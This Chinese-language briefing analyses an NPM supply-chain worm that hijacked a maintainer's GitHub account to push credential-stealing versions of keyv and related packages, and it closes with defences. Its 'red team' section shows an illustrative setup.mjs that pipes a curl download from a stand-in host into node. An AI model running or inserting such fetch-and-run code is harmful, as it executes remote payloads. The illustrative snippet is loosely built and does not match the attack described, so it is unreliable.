# 🚨 解析 NPM 套件竊密蠕蟲攻擊：技術細節與防禦策略

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution) 和 Info Leak
> * **關鍵技術**: `GitHub Actions`, `NPM OIDC Trusted Publishing`, `SLSA 來源證明`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 這次攻擊的根源是 GitHub 帳號的安全性問題，駭客入侵了熱門 JavaScript 套件 keyv 的維護者 Jared Wray 的 GitHub 帳號，從而取得了對相關套件的修改和發布權限。
* **攻擊流程圖解**:
  1. 駭客入侵 Jared Wray 的 GitHub 帳號。
  2. 駭客在受影響的套件中添加惡意程式碼，包括 `setup.mjs` 腳本。
  3. `setup.mjs` 腳本下載合法的 Bun JavaScript 執行環境，並啟動真正的竊密程式。
  4. 竊密程式搜尋和竊取 NPM、GitHub、AWS、Azure、Google Cloud、Kubernetes 及 HashiCorp Vault 憑證等敏感信息。
* **受影響元件**: 受影響的套件包括 keyv、flat-cache、file-entry-cache、cacheable-request、cacheable 及 cache-manager 等，涉及 2,212 個惡意版本及超過 14 個組織。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 駭客需要入侵 GitHub 帳號並取得相關套件的修改和發布權限。
* **Payload 建構邏輯**:

    ```
    
    javascript
      // setup.mjs 腳本示例
      const { exec } = require('child_process');
      exec('curl https://example.com/malicious_payload.js | node', (error, stdout, stderr) => {
        if (error) {
          console.error(`exec error: ${error}`);
          return;
        }
        console.log(`stdout: ${stdout}`);
        console.log(`stderr: ${stderr}`);
      });
    
    ```
  *範例指令*: 使用 `curl` 下載惡意腳本並執行。
* **繞過技術**: 駭客利用 GitHub Actions 和 NPM OIDC Trusted Publishing 機制發布首批惡意版本，使套件仍取得有效的 SLSA 來源證明。

  + 啟用主分支保護和強制程式碼審查。
  + 設定新套件版本 3 至 7 天的冷卻期。
  + 限制套件安裝指令和對外連線。
  + 監控新版本突然加入的可執行檔和安裝腳本。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **GitHub Actions**: GitHub 提供的自動化工作流程工具，允許用戶定義和運行自動化任務。
* **NPM OIDC Trusted Publishing**: NPM 的 OIDC 信任發布機制，允許用戶使用 GitHub Actions 自動發布套件。
* **SLSA 來源證明**: SLSA (Supply chain Levels for Software Artifacts) 的來源證明機制，用于記錄和驗證套件所使用的原始碼和建置流程。
